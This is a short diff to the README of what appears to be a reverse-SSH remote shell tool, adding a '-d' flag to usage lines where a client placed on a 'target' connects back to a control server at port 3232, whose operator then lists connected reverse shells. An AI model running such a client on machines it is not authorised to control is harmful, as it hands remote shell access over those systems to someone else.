@@ -89,7 +89,7 @@ cp ~/.ssh/id_ed25519.pub authorized_keys
 
 ```sh
 # copy client to your target then connect it to the server
-./client your.rssh.server.com:3232
+./client -d our.rssh.server.com:3232
 
 # Get help text
 ssh your.rssh.server.com -p 3232 help
@@ -145,7 +145,7 @@ cp ~/.ssh/id_ed25519.pub authorized_keys
 Put the client binary on whatever you want to control, then connect to the server.
 
 ```sh
-./client your.rssh.server.com:3232
+./client -d your.rssh.server.com:3232
 ```
 
 You can then see what reverse shells have connected to you using `ls`:
